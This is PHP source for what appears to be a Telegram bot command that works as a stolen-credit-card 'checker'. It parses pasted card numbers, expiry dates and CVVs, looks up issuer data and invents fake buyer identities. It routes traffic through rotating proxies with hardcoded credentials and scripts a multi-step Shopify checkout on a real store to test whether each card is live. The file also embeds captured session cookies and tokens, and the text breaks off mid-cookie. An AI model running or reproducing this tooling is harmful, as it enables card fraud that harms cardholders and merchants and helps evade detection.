<?php
    include __DIR__."/../config/config.php";
    include __DIR__."/../config/variables.php";
    include_once __DIR__."/../functions/bot.php";
    include_once __DIR__."/../functions/db.php";
    include_once __DIR__."/../functions/functions.php";
    require 'function.php';
    if(strpos($message, "/sh ") === 0 || strpos($message, "!sh ") === 0){
        $starttime = microtime(true);
        $antispam = antispamCheck($userId);
        addUser($userId);
        
        if($antispam != False){
          bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
          ]);
          return;
    
        }else{
            $delay = microtimeFormat($starttime);
            $messageidtoedit1 = bot('sendmessage',[
              'chat_id'=>$chat_id,
              'text'=>"<b>⌛Wait for Result...
⌛Time ➜  $delay Segs</b>",
              'parse_mode'=>'html',
              'reply_to_message_id'=> $message_id
    
            ]);
    
            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 4);
            $bin = substr($cc, 0, 6);

            echo $lista;
            
            if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
                $creditcard = $matches[0][0];
                $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
                $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
                $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
                $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
                $sk = $config['sk_keys'];
                shuffle($sk);
                $sec = $sk[0];
    
                file_put_contents('sk.txt',$sk);
        
                ###CHECKER PART###  
                //============================INFO BIN=======================//
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = capture($fim, '"bank":{"name":"', '"');
                $cname = capture($fim, '"name":"', '"');
                $brand = capture($fim, '"brand":"', '"');
                $country = capture($fim, '"country":{"name":"', '"');
                $phone = capture($fim, '"phone":"', '"');
                $scheme = capture($fim, '"scheme":"', '"');
                $type = capture($fim, '"type":"', '"');
                $emoji = capture($fim, '"emoji":"', '"');
                $currency = capture($fim, '"currency":"', '"');
                $binlenth = strlen($bin);
                $schemename = ucfirst("$scheme");
                $typename = ucfirst("$type");
                if(strpos($fim, '"type":"credit"') !== false){
                }
                curl_close($ch);
                
                
                /////////////////////==========[Unavailable if empty]==========////////////////
                
                
                if (empty($schemename)) {
                    $schemename = "Unavailable";
                }
                if (empty($typename)) {
                    $typename = "Unavailable";
                }
                if (empty($brand)) {
                    $brand = "Unavailable";
                }
                if (empty($bank)) {
                    $bank = "Unavailable";
                }
                if (empty($cname)) {
                    $cname = "Unavailable";
                }
                if (empty($phone)) {
                    $phone = "Unavailable";
                }
                //=============AREA PROXY===================//
                function rebootproxys()
                {
                    $poxySocks = file("proxy.txt");
                    $myproxy = rand(0, sizeof($poxySocks) - 1);
                    $poxySocks = $poxySocks[$myproxy];
                    return $poxySocks;
                }
                $poxySocks4 = rebootproxys();
                //============RANDOM USER DIRECCION=================//
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_COOKIE, 1); 
                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                $resposta = curl_exec($ch);
                $firstname = value($resposta, '"first":"', '"');
                $lastname = value($resposta, '"last":"', '"');
                $phone = value($resposta, '"phone":"', '"');
                $zip = value($resposta, '"postcode":', ',');
                $postcode = value($resposta, '"postcode":', ',');
                $state = value($resposta, '"state":"', '"');
                $email = value($resposta, '"email":"', '"');
                $city = value($resposta, '"city":"', '"');
                $street = value($resposta, '"street":"', '"');
                $numero1 = substr($phone, 1,3);
                $numero2 = substr($phone, 6,3);
                $numero3 = substr($phone, 10,4);
                $phone = $numero1.''.$numero2.''.$numero3;
                $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
                $serv_rnd = $serve_arr[array_rand($serve_arr)];
                $email= str_replace("example.com", $serv_rnd, $email);
                if($state=="Alabama"){ $state="AL";
                }else if($state=="alaska"){ $state="AK";
                }else if($state=="arizona"){ $state="AR";
                }else if($state=="california"){ $state="CA";
                }else if($state=="olorado"){ $state="CO";
                }else if($state=="connecticut"){ $state="CT";
                }else if($state=="delaware"){ $state="DE";
                }else if($state=="district of columbia"){ $state="DC";
                }else if($state=="florida"){ $state="FL";
                }else if($state=="georgia"){ $state="GA";
                }else if($state=="hawaii"){ $state="HI";
                }else if($state=="idaho"){ $state="ID";
                }else if($state=="illinois"){ $state="IL";
                }else if($state=="indiana"){ $state="IN";
                }else if($state=="iowa"){ $state="IA";
                }else if($state=="kansas"){ $state="KS";
                }else if($state=="kentucky"){ $state="KY";
                }else if($state=="louisiana"){ $state="LA";
                }else if($state=="maine"){ $state="ME";
                }else if($state=="maryland"){ $state="MD";
                }else if($state=="massachusetts"){ $state="MA";
                }else if($state=="michigan"){ $state="MI";
                }else if($state=="minnesota"){ $state="MN";
                }else if($state=="mississippi"){ $state="MS";
                }else if($state=="missouri"){ $state="MO";
                }else if($state=="montana"){ $state="MT";
                }else if($state=="nebraska"){ $state="NE";
                }else if($state=="nevada"){ $state="NV";
                }else if($state=="new hampshire"){ $state="NH";
                }else if($state=="new jersey"){ $state="NJ";
                }else if($state=="new mexico"){ $state="NM";
                }else if($state=="new york"){ $state="LA";
                }else if($state=="north carolina"){ $state="NC";
                }else if($state=="north dakota"){ $state="ND";
                }else if($state=="Ohio"){ $state="OH";
                }else if($state=="oklahoma"){ $state="OK";
                }else if($state=="oregon"){ $state="OR";
                }else if($state=="pennsylvania"){ $state="PA";
                }else if($state=="rhode Island"){ $state="RI";
                }else if($state=="south carolina"){ $state="SC";
                }else if($state=="south dakota"){ $state="SD";
                }else if($state=="tennessee"){ $state="TN";
                }else if($state=="texas"){ $state="TX";
                }else if($state=="utah"){ $state="UT";
                }else if($state=="vermont"){ $state="VT";
                }else if($state=="virginia"){ $state="VA";
                }else if($state=="washington"){ $state="WA";
                }else if($state=="west virginia"){ $state="WV";
                }else if($state=="wisconsin"){ $state="WI";
                }else if($state=="wyoming"){ $state="WY";
                }else{$state="KY";}

                //==================[BIN LOOK-UP]======================//
                $ch = curl_init();
                $bin = substr($cc, 0,6);
                curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $bindata = curl_exec($ch);
                $binna = json_decode($bindata,true);
                $brand = $binna['scheme'];
                $country = $binna['country']['name'];
                $type = $binna['type'];
                $bank = $binna['bank']['name'];
                curl_close($ch);
                //==================[BIN LOOK-UP-END]======================//
                
                if($mes == "01"){
                    $sub_mes = "1";
                }elseif($mes == "02"){
                    $sub_mes = "2";
                }elseif($mes == "03"){
                    $sub_mes = "3";
                }elseif($mes == "04"){
                    $sub_mes = "4";
                }elseif($mes == "05"){
                    $sub_mes = "5";
                }elseif($mes == "06"){
                    $sub_mes = "6";
                }elseif($mes == "07"){
                    $sub_mes = "7";
                }elseif($mes == "08"){
                    $sub_mes = "8";
                }elseif($mes == "09"){
                    $sub_mes = "9";
                }elseif($mes == "10"){
                    $sub_mes = "10";
                }elseif($mes == "11"){
                    $sub_mes = "11";
                }elseif($mes == "12"){
                    $sub_mes = "12";
                }

                if($ano == "22"){
                    $sub_ano = "2022";
                }elseif($ano == "23"){
                    $sub_ano = "2023";
                }elseif($ano == "24"){
                    $sub_ano = "2024";
                }elseif($ano == "25"){
                    $sub_ano = "2025";
                }elseif($ano == "26"){
                    $sub_ano = "2026";
                }elseif($ano == "27"){
                    $sub_ano = "2027";
                }elseif($ano == "28"){
                    $sub_ano = "2028";
                }elseif($ano == "29"){
                    $sub_ano = "2029";
                }elseif($ano == "30"){
                    $sub_ano = "2030";
                }elseif($ano == "31"){
                    $sub_ano = "2031";
                }elseif($ano == "32"){
                    $sub_ano = "2032";
                }elseif($ano == "33"){
                    $sub_ano = "2033";
                }elseif($ano == "34"){
                    $sub_ano = "2034";
                }elseif($ano == "2022"){
                    $sub_ano = "2022";
                }elseif($ano == "2023"){
                    $sub_ano = "2023";
                }elseif($ano == "2024"){
                    $sub_ano = "2024";
                }elseif($ano == "2025"){
                    $sub_ano = "2025";
                }elseif($ano == "2026"){
                    $sub_ano = "2026";
                }elseif($ano == "2027"){
                    $sub_ano = "2027";
                }elseif($ano == "2028"){
                    $sub_ano = "2028";
                }elseif($ano == "2029"){
                    $sub_ano = "2029";
                }elseif($ano == "2030"){
                    $sub_ano = "2030";
                }elseif($ano == "2031"){
                    $sub_ano = "2031";
                }elseif($ano == "2032"){
                    $sub_ano = "2032";
                }elseif($ano == "2033"){
                    $sub_ano = "2033";
                }elseif($ano == "2034"){
                    $sub_ano = "2034";
                }
                //=======================[Proxys]=============================//
                $Websharegay = rand(0,250);
                $rp1 = array(
                    1 => 'djysglej-rotate:de1u4mj43pll',
                    2 => 'djysglej-rotate:de1u4mj43pll',
                ); 
                $rotate = $rp1[array_rand($rp1)];

                $ch = curl_init('https://api.ipify.org/');
                curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_PROXY => 'http://p.webshare.io:80',
                CURLOPT_PROXYUSERPWD => $rotate,
                CURLOPT_HTTPGET => true,
                ]);
                $ip1 = curl_exec($ch);
                curl_close($ch);
                ob_flush();  
                if (isset($ip1)){
                $ip = "Live! ✅";
                }
                if (empty($ip1)){
                $ip = "Dead![".$rotate."] ❌";
                }
                echo '[ IP: '.$ip.' ] ';

                $username = 'LYHBl6a1ssT';
                $password = 'zc7l6f4Tn';
                $autUser= $username.":".$password;
                
                $proxiss = explode(":", $poxySocks4);

                //=======================[Proxys END]=============================//
                $num = rand(1000, 9999);
                $XeroSploitJef = uniqid();

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://shoptheweitzman.org/cart/40703709347997:1?traffic_source=buy_now');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
                curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                $headers = array();
                $headers[] = 'Host: shoptheweitzman.org';
                $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
                $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
                $headers[] = 'Connection: keep-alive';
                $headers[] = 'Upgrade-Insecure-Requests: 1';
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                $curl = curl_exec($ch);
                $shit = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL );
                // curl_close($ch);

                $checkouts = trim(strip_tags(getStrss($curl,'shoptheweitzman.org\/57165742237\/checkouts\/','"')));
                $authenticity_token = trim(strip_tags(getStrss($curl,'name="authenticity_token" value="','"')));
                // echo "\nPASO1:".$curl;
                echo "\nPASO1:".$authenticity_token;
                echo "\nPASO1:".$checkouts;
                # -------------------- [2 REQ] -------------------#

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://shoptheweitzman.org/57165742237/checkouts/'.$checkouts.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                // curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
                // curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
                // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
                // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                curl_setopt($ch, CURLOPT_POST, 0);
                $headers = array();
                $headers[] = 'authority: shoptheweitzman.org';
                $headers[] = 'method: POST';
                $headers[] = 'path: /57165742237/checkouts/'.$checkouts.'';
                $headers[] = 'scheme: https';
                $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
                $headers[] = 'accept-language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
                $headers[] = 'content-type: application/x-www-form-urlencoded';
                $headers[] = 'origin: https://shoptheweitzman.org';
                $headers[] = 'referer: https://shoptheweitzman.org/';
                $headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
                $headers[] = 'sec-ch-ua-mobile: ?0';
                $headers[] = 'sec-ch-ua-platform: "Windows"';
                $headers[] = 'sec-fetch-dest: document';
                $headers[] = 'sec-fetch-mode: navigate';
                $headers[] = 'sec-fetch-site: same-origin';
                $headers[] = 'sec-fetch-user: ?1';
                $headers[] = 'upgrade-insecure-requests: 1';
                $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($authenticity_token).'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=hdhdjdjdn%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bpick_up_in_store%5D%5Bselected%5D=true&checkout%5Bid%5D=delivery-pickup&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=CA&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bpick_up_in_store%5D%5Bhandle%5D=b286f020a624a1f165cf3e8777ea0d53&checkout%5Bclient_details%5D%5Bbrowser_width%5D=758&checkout%5Bclient_details%5D%5Bbrowser_height%5D=730&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
                $result2 = curl_exec($ch);
                // curl_close($ch);
                // echo "\nPASO2:".$result2;
                $authenticity_token2 = trim(strip_tags(getStrss($result2,'name="authenticity_token" value="','"')));
                $total = trim(strip_tags(getStrss($result2,'data-checkout-payment-due-target="','"')));
                echo "\nPASO2:".$authenticity_token2;
                echo "\nPASO2:".$total;
                # -------------------- [2 REQ] -------------------#

                //=======================[3 REQ]==============================//

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                // curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
                // curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
                // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
                // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                curl_setopt($ch, CURLOPT_POST, 1);
                $headers = array();
                // $headers[] = 'Accept: */*';
                // $headers[] = 'Accept-Language: es-ES,es;q=0.9';
                // $headers[] = 'Accept-Encoding: gzip, deflate, br';
                // $headers[] = 'Connection: keep-alive';
                $headers[] = 'Content-Type: application/json';
                // $headers[] = 'Host: deposit.us.shopifycs.com';
                // $headers[] = 'Origin: https://checkout.shopifycs.com';
                // $headers[] = 'Referer: https://checkout.shopifycs.com/';
                // $headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
                // $headers[] = 'sec-ch-ua-mobile: ?0';
                // $headers[] = 'DNT: 1';
                // $headers[] = 'sec-ch-ua-platform: "Windows"';
                // $headers[] = 'Sec-Fetch-Dest: empty';
                // $headers[] = 'Sec-Fetch-Mode: cors';
                // $headers[] = 'Sec-Fetch-Site: same-site';
                // $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","name":"Carlos Luis","month":'.$sub_mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"shoptheweitzman.org"}');
                $result3 = curl_exec($ch);
                // echo "\nPASO3>".$result3;
                // curl_close($ch);
                $sid = trim(strip_tags(getStrss($result3,'{"id":"','"}')));
                echo "\nPASO3>".$sid;
                //=======================[3 REQ-END]==============================//
                //=======================[4 REQ]==============================//

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://shoptheweitzman.org/57165742237/checkouts/'.$checkouts.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                // curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
                // curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
                // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
                // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                curl_setopt($ch, CURLOPT_POST, 0);
                $headers = array();
                $headers[] = 'authority: shoptheweitzman.org';
                $headers[] = 'method: POST';
                $headers[] = 'path: /57165742237/checkouts/'.$checkouts.'';
                $headers[] = 'scheme: https';
                $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
                $headers[] = 'accept-language: es-PE,es;q=0.9';
                $headers[] = 'cache-control: max-age=0';
                $headers[] = 'content-type: application/x-www-form-urlencoded';
                $headers[] = 'origin: https://shoptheweitzman.org';
                $headers[] = 'referer: https://shoptheweitzman.org/';
                $headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
                $headers[] = 'sec-ch-ua-mobile: ?0';
                $headers[] = 'sec-ch-ua-platform: "Windows"';
                $headers[] = 'sec-fetch-dest: document';
                $headers[] = 'sec-fetch-mode: navigate';
                $headers[] = 'sec-fetch-site: same-origin';
                $headers[] = 'sec-fetch-user: ?1';
                $headers[] = 'upgrade-insecure-requests: 1';
                $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($authenticity_token2).'&previous_step=payment_method&step=&s='.$sid.'&checkout%5Bpayment_gateway%5D=74413867165&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=Fernando&checkout%5Bbilling_address%5D%5Blast_name%5D=David&checkout%5Bbilling_address%5D%5Baddress1%5D=1500+Van+Ness+Ave&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=San+Francisco&checkout%5Bbilling_address%5D%5Bprovince%5D=CA&checkout%5Bbilling_address%5D%5Bzip%5D=94109&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=&checkout%5Btotal_price%5D='.$total.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=774&checkout%5Bclient_details%5D%5Bbrowser_height%5D=730&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
                $result4 = curl_exec($ch);
                // echo "\nPASO4:".$result4;
                // curl_close($ch);

                # -------------------- [4 REQ] -------------------#
                $trans = explode("?", $checkouts);
                echo "\ncheckeout>".$trans[0];
                # -------------------- [5 REQ] -------------------#
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://shoptheweitzman.org/57165742237/checkouts/'.$trans[0].'/processing?from_processing_page=1');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
                curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                // curl_setopt($ci, CURLOPT_HTTPPROXYTUNNEL , 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                $headers = array();
                $headers[] = 'Host: shoptheweitzman.org';
                $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
                $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
                // $headers[] = 'cookie: checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4TUdKbVltVmpNR1EwTXpZMFpUTmlZak5tTnpjM1l6ZGhOR0l4WlRBMFpRWTZCa1ZVIiwiZXhwIjoiMjAyMi0xMi0xN1QwOToyMDo0NS40MTlaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--77406852a75762bd9b14f07c933d12ff1542b517; hide_shopify_pay_for_checkout=false; tracked_start_checkout=beae0ba91ece337c9720ac1acf0780d8; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpWldGbE1HSmhPVEZsWTJVek16ZGpPVGN5TUdGak1XRmpaakEzT0RCa09BWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMS0yNlQwOToyMDo0NS40MTlaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--4980b5c60beaa8abe12bc4b4efa193af237d2a71; localization=US; cart_currency=USD; cart=03e652e77fde07610aa8bb4fbc05cd18; cart_ts=1669450794; checkout_session_token__c__03e652e77fde07610aa8bb4fbc05cd18=%7B%22token%22%3A%22ZkNMWXRXM1U1VTVZRjNCejZITUljM2NTVXlhams4SUZUWjhZZUNOQm85ZUVhUlJhSmR0OXMwMHY2VkYyRy9wWVNrQ2dmQURCTU9SN1pZb0x4ZUZlYXdlOVIwYkZzTmhERCtLdzZsOVhyVTY2TjNpWmphYk9YdzMrdjE1NXlpaGpkbEJVWmpOc25Ib0NoRTRwMld2QlJEaTNhQ3lmSnRLbitYTnorNDR5NVl0UzJSZEVvQVNyWXhlMEJnSjQvMU83U0VkbEhxNEhBQ2FtL2ZySXNjdE5hcXp0NzQxRE1SU0szbWNSRUFHREtobGd2cmgzTFJ0cmYrY1Y2WC9lZlBJaUxqNTJrVkt0VXVYQWJDZ01NbWpXcVlHQVdMbVdER0M4d0x2Yk1Gd2FzQ1NySGc9PS0tT0wrT0huYzJnNmxXaXFVZy0tN2UxNmJneHBLNGM5d3ZGWVNCU1Y5Zz09%22%2C%22locale%22%3A%22en-US%22%7D; secure_customer_sig=; _y=74c44bcb-9b4b-436d-9d44-88f80ce201c5; _shopify_y=74c44bcb-9b4b-436d-9d44-88f80ce201c5; _shop_pay_experiment=shop_pay_enabled; _orig_referrer=; _landing_page=%2Fcheckouts%2Fc%2F03e652e77fde07610aa8bb4fbc05cd18; _ga=GA1.2.567874460.1669450799; _gid=GA1.2.2108545978.1669450799; _gcl_au=1.1.1777486257.1669450799; _fbp=fb.1.1669450799190.545456744; _pin_unauth=dWlkPU5qaGpOMll3TkRVdFpUVmhPQzAwTTJSbUxXSTBORGt0TkRnM1pXTTJPVGc0T1RJMw; hide_shopify_pay_for_checkout=false; queue_token=Ap1fSrlK37ajw629ePiAHmG6PxcFN450a1t_P3_MnCWFP3mcnxgeo8UImLAUPK52t32Xu-8YDzh1Pw0fTndQxZZiRS_l--h-NytL6Loofv_AN65MmRyMyDxKu6A9BPI-U8GI1UeY6iI4Y9GyqhaGyv-6F96LU_dFb02AOPUOfIGgdvC4_qCr5A==; cart_sig=96dc6d9b89cd6c5bcc270b982961e76e; cart_ver=gcp-us-east1%3A3; _secure_session_id=d71f0039a292f48e2f511c066fca0f11; 